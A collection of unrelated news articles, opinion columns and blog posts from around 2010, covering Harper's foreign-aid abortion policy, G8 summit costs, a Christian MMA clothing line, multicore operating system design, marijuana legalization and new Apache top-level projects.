OTTAWA — For the first time since taking power more than four years ago , Prime Minister Stephen Harper this week openly embraced a solid , social - conservative policy of the right — refusing to have Canada support abortion in foreign - aid projects .
Political observers were stunned .
After all this time practising the politics of pragmatism , steering his party away from any of the polarizing , social conservatism that scares off many women , urban and centrist voters , Harper branded his government as anti-abortion .
It ’s a decision that could well haunt the Conservatives into the next election campaign , depending on how Harper ’s opponents handle it .
What ’s even more odd about this decision is that it runs directly counter to how the Prime Minister himself wanted to handle this hot potato when Liberals forced the question on to the national agenda earlier this year .
Harper , according to Conservative - caucus sources , was not leaning this way two months ago , and made that clear to his MPs in March .
So , if you want to understand why Canada now stands virtually alone among its G8 partners in opposing abortion as part of family - planning projects in poor nations , you have to take a close look at Harper ’s tactics , not his ideology .
And though it ’s pretty much become a cliché around Parliament
Hill the past four years , you could actually blame the opposition Liberals for how this has all turned out .
This potentially far - reaching foreign - policy decision has its roots in a domestic skirmish on Parliament Hill about six weeks ago , when the Liberals decided to have some sport with Conservatives and force a question on abortion in the Commons .
Ever since January , when Harper announced in the op - ed pages of the Star that Canada ’s new foreign - aid priority would focus on the health of mothers and children , the Liberals had been demanding to know whether this would also include support for abortion among the family - planning initiatives .
It was a way , Liberal tacticians believed , to pry open some divisions within the Conservative caucus .
So the Liberals , in retrospect too clever by half , used an opposition day in the Commons to hold a vote on a motion that called on Canada to support the “ full range ” of family planning initiatives in foreign aid .
The motion , sponsored by Liberal MP Bob Rae , also read in part : “ the Canadian government should refrain from advancing the failed right - wing ideologies previously imposed by the George W. Bush administration in the United States which made humanitarian assistance conditional upon a ‘ global gag rule ’ that required all non-governmental organizations receiving federal funding to refrain from promoting medically sound family planning . ”
According to Conservative insiders , Harper initially argued at a special caucus meeting on the day of the vote for his party to avoid the ideological trap , and quietly vote in favour of the motion .
But the Conservative caucus , which is roughly evenly divided between pro-choice and anti-abortion sentiments , had another idea .
They believed that the mention of Bush gave Conservatives a way to oppose the motion — Canada ’s Parliament should n’t be voting on policies of another government .
Harper , according to caucus sources , allowed himself to be persuaded .
When he closed the caucus meeting , he cited some Mahatma Gandhi wisdom about a leader needing to heed his followers , and agreed the Conservatives , against his initial instincts , should oppose the motion .
What Harper did n’t know at the time was that the Liberals were walking into their own trap , with huge consequences for Canada ’s foreign - aid policies .
When the vote took place on March 23 , three Liberal MPs voted with the Conservatives and 13 others stayed away .
The Commons voted against the “ full range ” of options .
Liberal leader Michael Ignatieff later told interviewers it was “ a bad day at the office . ”
It was more than that .
This is what he did back in 2002 , when he saw Peter MacKay win the leadership of the old Progressive Conservative party through a deal with David Orchard , an anti-free - trade farmer from Saskatchewan , who had amassed enough support in the race to potentially steer the PCs away from their traditional base .
“ Harper saw the MacKay - Orchard deal as an opening , ” says Bob Plamondon , author of Full Circle , an insider account of how the right eventually united under Harper ’s leadership , starting almost immediately after that convention and secret talks between MacKay and Harper .
Harper calculated , correctly , that if the Progressive Conservatives were out shopping for coalitions , he might be able to provide a more solid , acceptable one to the majority of the old party .
History shows he was right — within a year , the parties were merged and he was the leader .
Moreover , there ’s another element of Harper ’s past that ’s important in understanding why he wrapped his party in the anti-abortion mantle this week .

In the late 1980s , in a memo to then Reform Party leader Preston Manning , Harper laid out the need for the fledgling party to build coalitions with the Christian right , which he described as a growing social force and key to the Conservative base .
“ I believe that the Reform Party cannot afford to lose moderate pro-life voters , ” said the memo , which was revealed in William Johnson ’s biography of Harper a few years ago .
Casting forward to the present , then , Harper has been given two strategic ingredients to make a bold move — a weak coalition among his Liberal rivals and an opportunity to shore up the social - Conservative base .
That wing of the party is clearly delighted .
On Lifesitenews.com this week , REAL Women vice - president Gwen Landolt is quoted saying she ’s glad Canada is n’t trying to force its “ elitist imperialism ” of pro-choice on the Third World .
As a bonus , caucus is happy too — one Conservative said that the mood at this week ’s meeting was upbeat , because Harper cast this week ’s announcement as totally in line with what his MPs and senators demanded at that special gathering in March .
What ’s more , Harper has n’t actually had to revisit abortion policies in this country .
Again , the Liberals may have given him the strategic “ out ” on this one .
In a little - noticed intervention in February , Liberal MP Keith Martin , a physician and an international - development veteran , suggested to reporters that the solution in the abortion - maternal - health controversy could be for G8 nations to divide up the programs — other countries could deliver abortion - related services and Canada could focus on other priorities , such as clean water or other medical needs .
That ’s exactly the kind of thing Harper and International Development Minister Bev Oda were talking about this week in the wake of the abortion decision .
In other words , if U.S. Secretary of State Hillary Clinton believes abortion is such a necessary part of aid for women in developing countries — as she so publicly declared when visiting Canada a few weeks ago — then she can put American money where her mouth is .
One Conservative said this week that he ’s getting tired of Clinton being held up as an example of consistency in this debate — in large swaths of the United States , abortion is still illegal , so Canada is n’t the only country that ’s going to have one policy at home on this issue and another on the world stage .
All this said , there are people who are n’t convinced that Harper has handled this all that well ; he ’s just lucky he has n’t handled this as badly as the Liberals did .
“ My guess is that the Conservatives started the maternal - health agenda to build a relationship with urban / suburban women under 50 without thinking through what would become a challenge with part of their base , namely that some funds would end up supporting choice / abortion , ” says Bruce Anderson , a pollster with Harris - Decima and a political analyst with National Public Relations .
“ To my eyes , since then the Conservatives have not been trying to provoke a debate on this as much as avoid one , ” Anderson says .
Much depends on how Harper ’s opponents take the debate from here .
“ If the Liberals are on their game , they will continue to shine a light on this choice that the PM has made , ” says Anderson .
Clinton may be annoying some Conservatives , but she still is somewhat of an icon for centrist and centre - left women in Canada , says Anderson , and it does n’t look good for Harper to be seen to be antagonizing that constituency .
Meanwhile , the women who will potentially feel the biggest effect of this decision — women in developing countries who are seeking an abortion — do n’t have a vote in Canada .
If they did , the past few months might have turned out differently .
But Canada is now an anti-abortion nation on the world stage , for very domestic , political reasons .

Next month ’s G8 and G20 summits are a self - fulfilling prophecy .
World leaders make themselves a beckoning target and then shake down taxpayers for $ 1 billion in protection .
Even if meeting face - to - face has merit , gathering presidents and prime ministers in public places no longer makes sense .
It is n’t justified by the photo opportunity , the final communiqué drafted before meetings begin or commitments often abandoned before the last press conference ends .
Summits are being changed by the changing nature of the threat .
Back in those madcap Cold War days of mutual assured destruction , enemies were few , well known and cheap to neuter .
In a new millennium of metastasized terrorism , danger is cellular , difficult to detect and exorbitant to counter .
So the surprise is n’t that three days in Huntsville and Toronto will cost much just when every penny needs to be pinched .
No , the shocker is that it ’s taken so long to spot an anachronism that surely can’t be sustained much longer .
Common sense says there are better ways .
If face time is the guiding purpose then military bases everywhere offer security plus room and board , even if they are short on the luxurious perquisites of power .
If deconstructing complex problems is the goal , then its time to re-noodle the curious notion that global governance is a travelling road show .
Sometime between their 1975 founding and current floundering , world summits morphed from potentially sublime to patently ridiculous .
The sound idea of getting leaders together informally was lost in the racket created by hundreds of hangers - on , the sherpas , sous - sherpas and sous - sous - sherpas who between meetings trek messages between capitals and by the horde of journalists who fly in mostly to watch the spectacle on television .
How crazy is it now ?
A fleet of Boeing 747s will airlift delegations .
Entourages will come and go seeing little of leaders .
Journalists will interview each other before reaching the consensus that becomes the news .
Apologists still run sticky fingers down the short list of summit accomplishments .
They murmur that Africa benefitted from the last summit Canada hosted .
They point to how often serendipitous circumstance brings leaders together just as another international crisis – this year ’s hot prospects are a sovereign equity catastrophe or a Korean conflict — tests world resolve .
True enough .
But was the Kananaskis bun-toss the best or only way to confront the problems of a continent that has no permanent seat at the G8 table ?
Or is even the broader spectrum G20 an effective forum for defusing specific risk ?
A new model is urgently needed .
Problems without borders – climate change to nuclear proliferation and terrorism – are making reform of international institutions essential .
Moving from helter - skelter , break - the - bank summits to something with more utility and less cost will demand the most modest of political sacrifices .
Summit hosts will have to muster the inner strength to forego playing to the home audience once every eight years .
Reform is made more certain by the shocked reaction to this week ’s news that security costs have spiked from $ 179 million in March to some $ 930 million today .
Remember , that ’s only for protection ; the events cost extra .

In the shaky aftermath of recession , at a time of belt - tightening , the price of summits is way over the top .
As certainly as voters here wo n’t let politicians hide their expenses from the auditor general , taxpayers everywhere will soon say no to leaders blowing billions turning city centers into security zones .
Summits have now reached their peak ; the only place left to go is back down to reality .

If you were a cynical 12 - year - old boy like I was , then the words Mighty Morphin ’ Power Rangers will bring to mind bitter thoughts of cheesy dialogue , bright spandex uniforms , and choreographed live - action anime fight scenes , all overdubbed and irritatingly formulaic .
Other children ( many , actually ) fell in love with the show , and its popularity continues to grow as new generations are taken in by the bright colors and trademark teamwork of the heroes .
I had n’t thought about the Power Rangers in years until I learned that one of the show ’s stars , Jason David Frank ( who played Tommy Oliver , The Green Ranger ) is the founder of a Mixed Martial Arts clothing line for the Christian Fighter / MMA enthusiast called Jesus Did n’t Tap .
Jesus as the One True Warrior
The thought of a man who spent his formative years delivering campy dialogue and roundhouse kicks ( all while wearing a fierce ’ 90s ponytail ) now marketing the Lord with Mixed Martial Arts was intriguing , to say the least .
The Mighty Morphin ’ alumni already boast a convicted murderer , an actress who died young in a car crash , and now , with Jason David Frank , an anointed fighter and proselytizer .
Frank has swapped the full - body Power Rangers getup for MMA shorts , four - ounce gloves , and a muscular frame with so many tattoos the man looks graffitied .
He has a 2 - 0 record in the cage ( his wins coming via omoplata submission and TKO ) and according to TMZ , Frank even has his eyes set on fighting Jean Claude Van Damme .
Back in November of 2009 , I spoke with Frank on the phone .
He lives in Texas and managed to squeeze my call into a 15 - minute window , between his training and a “ meeting , ” which might have been for either Jesus Did n’t Tap , his chain of Rising Sun Karate schools , or one of the other projects he has in the pipeline .
As he told it , one day Frank and a partner “ did statistics on Christian numbers ” and decided that it was a huge market to tap into .
According to Frank , in their first year alone ( 2008 ) , they did over $ 250,000 in sales , and the J.D.T. line is only growing .
In February the New York Times published R.M. Schneiderman ’s article “ Flock Is Now a Fight Team in Some Ministries ” about the “ growing number of evangelical churches that have embraced mixed martial arts — a sport with a reputation for violence and blood that combines kickboxing , wrestling , and other fighting styles — to reach and convert young men , whose church attendance has been persistently low . ”
Jesus Did n’t
Tap offers the newly converted Christian - inspired threads that wo n’t clash with the Affliction and Tap Out gear already in their wardrobes .
There ’s no doubt that Jesus Did n’t Tap was a great business move , but what Frank tries to make clear is that it ’s not all about the money .
For a long time the 36 - year - old “ wanted to come up with something strong to show people that really there ’s only one true warrior in life , and it ’s Jesus .
And Jesus never complained ” — i.e. never tapped .
In summa , what Frank is trying to say is “ There was a guy by the name of Jesus Christ and he was positive . ”
Giving the Prince of Darkness a Noogie
Frank ’s “ positive Jesus Christ ” shows up on the J.D.T. “ Street Wear ” ( crewnecks , long - sleeves , hoodies , sweats , beanies , fitted hats ) , “ Fight Wear ” ( MMA fight shorts , gloves , rashguards ) , and other accoutrements ( stickers , patches , and dog tags ) .
The images are often cartoonish and evince a simple mythology of anthropomorphized good vs. evil : Jesus ( w/ halo ) battles Satan ( w/ tail , goatee , and skin the color of Frank ’s® RedHot® ) .
On the Get a Hold of Your Life shirt , it looks like Jesus is both choking Satan and giving the Prince of Darkness a noogie .
Some of the shirts are cute , like Jesus Loves Me and My New Tattoos .
( Frank ’s an obvious fan of the ink ; even his left forearm , from wrist to elbow , advertises the Jesus Did n’t Tap line . )
Other messages seem as if they were lifted from a generic self - help book .
The Break Your Bad Habits shirt has an image of Jesus arm - barring the Devil , who , for some reason , is wearing a pair of cutoff shorts .
The wordplay on the Putting the Jew in Jiu-Jitsu T - shirt is off - putting ; yet on the same shirt you have the silhouette of a crucified Jesus looking down at the shadow the cross is casting : a shadow made up of two men grappling in the formation of the crucifix .
The surreal image is almost a revelation .
Some may think that choosing to market Christianity with MMA — a sport where the goal is to beat the shit out of your opponent — is contradictory .
But Christian MMA fans have their apologists .
Sites like Anointed Fighter provide answers to questions like “ Can a true Christian compete in a full contact sport like MMA ?
What does the Bible say ? ”
While I ’m sure many would be interested to know whether or not Jesus would order the next Ultimate Fighting Championship event on Pay - Per - View , there are larger issues at stake .
As Schneiderman writes in his New York Times piece , “ the outreach [ of churches to MMA fans ] is part of a larger and more longstanding effort on the part of some ministers who fear that their churches have become too feminized , promoting kindness and compassion at the expense of strength and responsibility . ”
In a blog post , Eugene Cho , a Christian who was interviewed for the Schneiderman article , writes “ What I have a problem with is when we have Christians , churches , and pastors who now begin to blur the line in equating MMA to Jesus ; that we somehow speak with great conviction that Jesus would have endorsed MMA or other forms and expressions of the growing hyper- machismo culture . ”
In Cho ’s view ,
“ To reduce Christ to pop culture images of manhood seems wacky — theology and Bible exegesis gone bad .
Rather than focusing on external appearance , should n’t we focus on our ‘ heart , soul , body , and mind ’ ? ”
With the inclusion of “ body ” in the list of four , Cho manages to undercut his point just a little — because if MMA focuses on anything , it ’s definitely the body .
The strongest connection between the high - contact sport and Christianity may lie here .
Christianity has always had what could easily be called a masochistic relationship with the body and a bit of a fetish for blood .
Although it is not unique to Christian sects , members of monastic orders have used methods like starvation and self - flagellation to achieve states of transcendence and ecstasy .
For them the body ’s suffering ( and its effects on the mind ) has been an effective vehicle to God .
( Of course , this is never separate from the New Testament ’s tales of Jesus ’s own trial , suffering , and death . )
So it is not hard to see how a Christian may view MMA , with its grueling training regimens and bloody bouts , as simply another method .
A three - round match becomes a kind of Passion play , where the fighters experience the ecstasies of physical torment directly before a mostly male congregation .
The Elbows of Sin
Frank is aware of the controversy , yet , rather than take part in a theological dialectic — even though there is a J.D.T.
Bible — he seems content to let the product do the talking and the selling .
Because whatever the product lacks in nuance it makes up for in its unflagging allegiance to its message : Jesus is the “ one true warrior . ”
The problem comes when that message is adhered to so strongly that it verges on self - satire .
For example , the front page of the Jesus Did n’t Tap Web site features the following from Anointed Fighter ’s Danny L. White :
When Jesus stepped inside the cage of life to take on the cross , human legs did not kicked [ sic ] his out from under him .
It was not human hands that broke his arm during the arm bar of adversity .
It was not a human fist that knocked him to the mat for our sins .
It was not a human that kept him inside the triangle choke of suffering .
It was not the fighter ’s [ sic ] sent by Satan to tap him out that beat him .
God gave him strength while on his back being pounded in the face by the elbows of sin …
[ italics mine ]
It is hard to imagine a potential convert needing a metaphor to be laid on this thick .
That ’s not to say that everything Jesus Did n’t Tap makes is as over - the - top .
One of the more moving images can be seen on its How Do You Train ?
T - shirt .
The rhetorical question is accompanied by the image of Jesus carrying the cross — on his way to Golgotha , no doubt .
Frank tells me a joke he hears often : “ Jesus did n’t tap … because he could n’t . ”
I get it .
Jesus ’s arms and legs were tied ( and / or nailed ) to the cross , so he could n’t have tapped .
“ Ha - ha , ” Frank says , about to deliver a rhetorical punch .
“ Well , he could have verbally tapped . ”
Frank notes that in the cage one can verbally tap or give up .
As an example , he mentions a UFC fight between Matt Hughes and Georges St. Pierre .
At one point in the fight St. Pierre had Hughes ’ limbs incapacitated , so Hughes was forced to verbally tap , which brought an end to the fight .
For a second I wonder whether the Jesus / MMA metaphor has become literal for the former Green Mighty Morphin ’ Power Ranger .
Does Frank actually think the same rules applied to First Century A.D. Roman crucifixion as to a sport currently sanctioned in most of the 50 states ?
But then I close my eyes and think of Jesus on the cross , and I can’t help wondering what would Jesus wear ?
The Warriors of God crewneck ?
Or the Jesus Did n’t Tap , Neither Did Our Troops crewneck ?
With chip makers continuing to increase the number of cores they include on each new generation of their processors , perhaps it 's time to rethink the basic architecture of today 's operating systems , suggested Dave Probert , a kernel architect within the Windows core operating systems division at Microsoft .
The current approach to harnessing the power of multicore processors is complicated and not entirely successful , he argued .
The key may not be in throwing more energy into refining techniques such as parallel programming , but rather rethinking the basic abstractions that make up the operating systems model .
Today 's computers do n't get enough performance out of their multicore chips , Probert said .
" Why should you ever , with all this parallel hardware , ever be waiting for your computer ? " he asked .
Probert made his presentation on Wednesday at the University of Illinois at Urbana - Champaign 's Universal Parallel Computing Research Center .
Probert is on the team working on the next generation of Windows , though he said the ideas in this talk did not represent any actual work his team is doing for Microsoft .
In fact , he noted that many of the other architects on the Windows kernel development team do n't even agree with his views .
For the talk , he set out to define what a new operating system , if designed by scratch , would look like today .
He concluded it would be quite different from Windows or Unix .
Today 's typical desktop computer runs multiple programs at once , playing music while the user writes an e-mail and surfs the Web , for instance .
" Responsiveness really is king , " he said .
" This is what people want . "
The problem in being responsive , he noted , is " how does the OS know [ which task ] is the important thing ? "
You do n't want to wait for Microsoft Word to get started because the antivirus program chose that moment to start scanning all your files .
Most OSes have some priority scheduling to avoid these bottlenecks , but they are still crude .
( Probert even suggested telemetry , in the form of a " This Sucks ! " button on each computer , that a user can push whenever he or she gets frustrated with the computer 's pokiness .
The resulting data could be compiled to give OS developers a better idea of scheduling . )
As they began adding multiple processor cores , chip makers took a " Field of Dreams " approach to multicore chips :
Build them and hope the application programmers would write programs for them .
The problem is today 's desktop programs do n't use the multiple cores efficiently enough , Probert said .
To get the full benefit from multiple cores , developers need to use parallel programming techniques .
It remains a difficult discipline to master and has n't been used much , outside of specialized scientific programs such as climate simulators .
Perhaps a better way to deal with multiple cores is to rethink the way operating systems handle these processors , Probert said .
" Really , the question is , not how do we do parallel , but what do we do with all these transistors ? "
The current architecture of operating systems is based on a number of different abstractions , he explained .
In the early days of computing , one program was run on a single CPU .
When we wanted multiple programs to run on a single processor , the CPU time was sliced up into processes , giving each application the illusion that it was running on a dedicated CPU .
The idea of the process was an abstraction , and would n't be the last one .
Once the OS started juggling multiple programs , it needed a protected space , free from user and program interference .
Thus was born the kernel mode , which is separate from the space in which the programs were run , the user mode .
In effect , kernel mode and user mode abstracted the CPU into two CPUs , Probert said .
With all these virtual CPUs , however , come struggles over who gets the attention of the real CPU .
The overhead of switching between all these CPUs starts to grow to the point where responsiveness suffers , especially when multiple cores are introduced .
But with Intel and AMD predicting that the core count of their products will continue to multiply , the OS community may be safe in jettisoning abstractions such as user mode and kernel mode , Probert argued .
" With many - core , CPUs [ could ] become CPUs again , " he said .
" If we get enough of them , maybe we can start to hand them out " to individual programs .
In this approach , the operating system would no longer resemble the kernel mode of today 's OSes , but rather act more like a hypervisor .
A concept from virtualization , a hypervisor acts as a layer between the virtual machine and the actual hardware .
The programs , or runtimes as Probert called them , themselves would take on many of the duties of resource management .
The OS could assign an application a CPU and some memory , and the program itself , using metadata generated by the compiler , would best know how to use these resources .
Probert admitted that this approach would be very hard to test out , as it would require a large pool of existing applications .
But the work could prove worthwhile .
" There is a lot more flexibility in this model , " he said .
Maybe that juicy steak you ordered is n't a heart - attack - on - a - plate after all .
A new study from the Harvard School of Public Health suggests that the heart risk long associated with red meat comes mostly from processed varieties such as bacon , sausage , hot dogs and cold cuts — and not from steak , hamburgers and other non-processed cuts .
The finding ...
An incoherent tangle of prejudices and feelings wrapped up in hyperbole is the best Peggy Noonan can now muster .
How else to describe this morning 's column ?
It heralds nothing less than the end of the Obama presidency just a year and a half in :
The disaster in the Gulf may well spell the political end of the president and his administration ...
Seriously ?
Her evidence for this ?
She claims the Democrats do n't love him .
The latest poll of polls shows over 80 percent support .
She claims that he is " weakened , polarizing and lacking broad public support . "
Really ?
With unemployment at near record highs after a deep recession , Obama 's approval ratings are stuck just below 50 percent - and have been remarkably stable for months .
At this point in his presidency , Obama is about five points more popular than Reagan , who was poised to drop to 37 percent approval by January of 1983 .
Clinton was lower than Obama in June 1994 .
In today 's polarized climate and awful economy , Obama is remarkably resilient .
He has a favorable rating over 52 percent , and his unfavorable rating is at a six month low of 39 percent .
This is Obama 's political end ?
The premise of Noonan 's moronic column is that the federal government , especially the president , should be capable of ending an oil - pipe rupture owned and operated by private companies , using technology that only deep - sea oil companies deploy or understand .
And if such a technical issue is not resolved by government immediately , it reveals paralyzing presidential weakness and the failure of an entire branch of political philosophy .
Again : seriously ?
It 's Obama 's fault that under Bush and Cheney , government regulation of oil exploration was so poor and corrupt , corner cutting appears to have been routine ?
And this , Peggy , is what governments do , even when run by crazy - ass liberals .
Governments do not dig for oil ; they merely regulate those who dig for oil .
That the government failed to do so under the previous administration does not seem to me to be proof that this administration has failed .

It takes courage to stand up at work .
I ’m not talking about sticking your neck out , speaking truth to power or anything else so dramatic .
I mean it literally ; it is hard to find a way to work standing up at your desk instead of sitting down .
I know this because I ’ve spent several weeks trying to find the perfect way to work at my computer without a chair .
The search was not quixotic ; standing up is in vogue .
Medical researchers have found that people who stand at work tend to be much healthier than those who sit , and there ’s a large online subculture of stand - up fanatics who swear that getting rid of your chair will change your life .
But I was n’t just looking for better health ; standing , I hoped , would also improve how I work .
Several years ago , I read that the novelist Philip Roth writes at a computer propped up on a lectern .
I ’ve used this technique as an occasional therapy for writer ’s block .
I ’ll set my laptop on the kitchen counter and hover over it as if I were a conductor before an orchestra .
This seems to help .
Standing up saps some of my extra restless energy , allowing me to focus better on the task at hand .
The kitchen counter , though , was n’t meant for office work , and after a short while my neck begins to strain from staring down at the screen .

In November 2010 , California voters will consider a ballot initiative that would legalize marijuana in the state .
The proposed law includes restrictions on sale and use , such as a minimum purchase age of 21 , but the bill gives marijuana roughly the same legal status as alcohol .
Early polls suggest the measure will pass , although full - scale debate has not yet occurred .
Marijuana legalization is a far bigger step than decriminalization or medicalization , which have already occurred in California and other states .
Decriminalization legalizes possession of small amounts of marijuana , but it does not eliminate the underground market or permit easy taxation .
Medicalization is closer to legalization , but it still leaves producers and consumers in a legal gray area and collects less revenue than legalization .
Should California , or the country , legalize marijuana ?
Yes , for a multitude of reasons .
Legalization will move the marijuana industry above ground , just as the repeal of alcohol prohibition restored the legal alcohol industry .
A small component of the marijuana market might remain illicit — moonshine marijuana rather than moonshine whiskey — but if regulation and taxation are moderate , most producers and consumers will choose the legal sector , as they did with alcohol .
Legalization would therefore eliminate most of the violence and corruption that currently characterize marijuana markets .
These occur because , in underground markets , participants cannot resolve disputes via non-violent mechanisms such as lawsuits , advertising , lobbying , or campaign contributions .
Instead , producers and consumers in these markets use violence to resolve disputes with each other and bribery or violence to resolve disputes with law enforcement .
These features of “ vice ” markets disappear when vice is legal , as abundant experience with alcohol , prostitution , and gambling all demonstrate .
Legalization would result in numerous other benefits .
Medical marijuana patients would no longer suffer legal limbo or social stigma from using marijuana to treat nausea from chemotherapy , glaucoma , or other conditions .
Infringements on civil liberties and racial profiling would decline , since victimless crimes are a key cause of such police behavior .
Quality control would improve because sellers could advertise and establish reputations for a consistent product , allowing consumers to choose low or high - potency marijuana .
Legalization would also generate budgetary savings for state and federal governments , both by eliminating expenditures on enforcement and by allowing taxation of legalized sales .
I recently estimated that the net impact would be a deficit reduction of about $ 20 billion per year , summed over all levels of government .
The one impact of legalization that might be undesirable is an increase in marijuana use , but the magnitude of this increase is likely to be modest .
The repeal of alcohol prohibition in the U.S. produced about a 20 percent increase in use , while Portugal ’s 2001 de facto legalization of marijuana did not cause any measurable increase ; indeed , use was lower afterward .
Across countries , use rates for marijuana show little connection to the strictness of the prohibition regime .
The Netherlands has virtual legalization , for example , yet use rates do not greatly differ from those in the United States .
An increase in marijuana use , moreover , is not necessarily bad .
If the ballot initiative passes , people who would like to use marijuana but abstain due to prohibition would be able to consume responsibly ; legalization would allow them to enjoy marijuana without fear of arrest or incarceration and without concern over quality .
Some new users might generate adverse consequences for themselves or others , such as driving under the influence , but most irresponsible users are disregarding the law and consuming already .
Legalization will not , of course , eliminate all negatives of marijuana use .
But just as the harms of alcohol prohibition were worse than the harms of alcohol itself , the adverse effects of marijuana prohibition are worse than the unwanted consequences of marijuana use .
Legalization is therefore the better policy .

The ideal way to legalize marijuana is for the federal government to end its ban , while allowing each state to regulate and tax marijuana as it sees fit .
This would circumvent the complicated constitutional issues that will arise if the California initiative passes , as federal law would still prohibit marijuana .
But California ’s initiative is nevertheless a valuable step , since the federal government is not yet ready to legalize .
The California bill brings attention to the issue and , if adopted , will encourage other states and the federal government to follow suit .
The U.S. experiment with marijuana prohibition is just as misguided as was its earlier experiment with alcohol prohibition .
We learned our lesson once ; it is time to learn it again .

PALIN ENDORSES CANADIAN -STYLE SOCIALIZED MEDICINE ?….
Maybe she was kidding .
Perhaps there ’s some elusive context that makes the remarks seem less remarkable .
But at face value , it seems pretty amusing that Sarah Palin ’s family used to rely on Canada ’s health care system .
The former half - term Alaska governor was in Calgary over the weekend , and talked a bit about her family ’s history with the country .
“ My first five years of life we spent in Skagway , Alaska , right there by Whitehorse .
Believe it or not — this was in the ’60s — we used to hustle on over the border for health care that we would receive in Whitehorse .
I remember my brother , he burned his ankle in some little kid accident thing and my parents had to put him on a train and rush him over to Whitehorse and I think , is n’t that kind of ironic now .
Zooming over the border , getting health care from Canada . ”
Actually , yes , it is rather ironic .
Palin now believes President Obama is trying to impose socialized - medicine , which would be dangerous for Americans in need of care .
But Palin ’s wrong on both counts — the White House plan is n’t socialized - medicine , and the concept could n’t be too dangerous if it helped meet her own family ’s needs .
Universal health care : good enough for Palin ’s family , but not for yours ?
Markos added , “ Palin should reimburse Canada for the health care she stole without paying into their system . ”

Life The Ultimate Game
When you take a good look at society and life in general I think you will see that we are all just playing one huge game .
Most of us just do n’t realize it ’s a game because of our heavy conditioning , we were born into it as helpless little blank slates .
What is society ?
It ’s simply a set of rules , traditions , and expectations that we have all agreed consciously but mainly unconsciously to live by .
We all have certain roles and parts that we are expected to play out , but remember your true identity is never what you display to society .
Many of us spend our lives only remembering the past and imagining the future , that we forget it ’s really just a game .
When you forget that it ’s a game , you struggle with your external environment because you are in bondage to it .
Creating Your Own Game
Anytime you live and act in an unconscious manner you will become attached to whatever you are observing and experiencing .
When you live your life with awareness you are in a position to really play in this game called life .
You will be acting from a place where you feel deeply rooted in your inner self ; you will be centered and grounded in your own reality .
I just want you to take some time to think about your life .
Why do you do the things you do ?
Why do you live the way you do ?
Why do you want the things you want ?
Why do you see the world the way you do ?
Look into it deeply , look for the causes .
Whose game are you really playing ?
As you become awake and more conscious of yourself , you will feel like you are in this world but not of it .
You remain as a passive witness who observes everything from a higher vantage point .
You will be able to see how everyone is just acting out their part , just like a movie , whether they realize it or not .
This is the key , learning to observe oneself .
To observe without distorting or becoming attached to our thoughts .
You need to have an extremely quiet , yet alert mind to be able to observe yourself , to become acquainted to your silent witness who is observing your thoughts .
If you persist in learning to remain with your inner witness ( meditation ) , it will gradually become your predominate state of being .
This will create immense inner space , living in this space you will be able to see how you are acting out your part .
You will be able to freely observe yourself and observe the outside world simultaneously , it ’s like you ’re the director behind the camera , and you are able to see the whole scene as it plays out .
What happens when you realize that in the grand scheme of things , that life is just one huge cosmic game ?
You play your own game .
You decide what type of player you want to be .
You are able to handle situations creatively and think outside the box .
You feel emotionally balanced .
You do n’t let your emotions consume you , or express negative emotions that do n’t serve you .
You adapt to your life ’s situations and circumstances in the best way possible .
If you need to act serious you will do it , but deep down you are calm and collected .
Being serious is only on the surface , your just acting it out because its what ’s needed for the situation .
You ’re living in your own movie .
Everything becomes a game , and games are fun .
Well most games are 🙂
You learn to understand and not get caught up in pleasure and pain .
You do n’t react , you respond to life .
I feel that ultimately all the attitudes , approaches , beliefs , and mindsets we have adopted has shaped the type of player we are in this life .
Life can change in an instant when you change your attitude , approach , and understanding .
If you do n’t like the game your playing , its up to you to figure out how to change it .
Wake up do n’t wait to live your life .
Some people will end up playing the part of a father , mother , pastor , lawyer , doctor , etc. , and somewhere along the way forget what this whole thing is about .
Many people end up playing their parts unconsciously for the rest of their lives .
I think your life will be a great adventure the moment you decide to break free and play your part consciously .
I am assuming you will choose to play a game that will be full of joy and balance .
This is your life , learn to play with it .
Thank you for reading my post , be well .

The Apache Software Foundation Announces New Top - Level Projects
Record Number of Projects Launched via Apache Incubator and Current Initiatives
FOREST HILL , MD – 4 May , 2010 – The Apache Software Foundation ( ASF ) –- the all - volunteer developers , stewards , and incubators of 143 Open Source projects and initiatives -- today announced the creation of six new Top - Level Projects ( TLPs ) , setting an all - time record of the most new TLPs launched in a single month .
A Top -Level Project signifies that a Project 's community and products have been well - governed under the ASF 's meritocratic , consensus - driven process and principles .
Whilst a project is developing within the Apache Incubator or as a sub-project of an existing TLP , it benefits from hands - on mentoring from other Apache contributors , as well as the Foundation ’s widely - emulated process , stewardship , outreach , support , and community events .
" Becoming a Top - Level Project is a vote of confidence from the Foundation at - large , demonstrating a project has proven its ability to be properly self - governed , " said ASF Chairman Jim Jagielski .
" We are proud of our Committers ' dedication in building robust communities under the ASF process known as ' The Apache Way ' . "
All Apache Projects are overseen by a self - selected team of active contributors to the project .
Upon a Project 's maturity to a TLP , a Project Mangement Committee ( PMC ) is formed to oversee its day - to - day operations , including community development and product releases .
The six new TLPs include both a graduating project from the Apache Incubator as well as sub-projects of existing TLPs .
They are :
Graduating from the Apache Incubator
- Apache Traffic
Server is a richly - featured , fast , scalable , and extensible HTTP / 1.1 compliant caching proxy server .
Formerly a commercial product , Yahoo ! submitted Traffic Server to the Apache Incubator in 2009 .
Traffic
Server is widely recognized as an “ edge ” service in cloud computing ; an example of its use is to serve static content such as images and JavaScript , CSS , and HTML files , and route requests for dynamic content to a Web server such as the Apache HTTP Server .
Highly performant , Apache Traffic Server has been benchmarked to handle in excess of 75,000 requests per second ( RPS ) , and is used in production in large - scale deployments such as Yahoo ! , where it handles 400 terrabytes of traffic per day , and serves more than 30 billion objects daily across its various properties including the Yahoo !
homepage , and its Sports , Mail , and Finance sites .
Former Sub- projects of Existing Top - Level Projects
- Apache Mahout provides scalable implementations of machine learning algorithms on top of Apache Hadoop and other technologies .
It offers collaborative filtering , clustering , classification , feature reduction , data mining algorithms , and more .
Begun as a sub-project of Lucene in 2008 , Mahout 's team of nearly a dozen contributors is now actively working towards release 0.4 .
- Apache Tika is an embeddable , lightweight toolkit for content detection , and analysis .
Powering by MIME standards from IANA , advanced language detection features and on the ability to rapidly unify existing parser libraries , Tika provides a one - stop shop for navigating the modern information landscape .
Tika entered the Incubator in 2007 and graduated to a Lucene sub- project in 2008 .
Tika is used in a broad range of Lucene products ranging from Solr , to Nutch and Mahout and is in deployment at NASA , Day Software , the Internet Archive , and at a number of Web startups including Bixo labs .
- Apache Nutch is a highly - modular , Web searching engine based on Lucene Java with added Web - specifics , such as a crawler , a link - graph database , and parsers for HTML and other document formats .
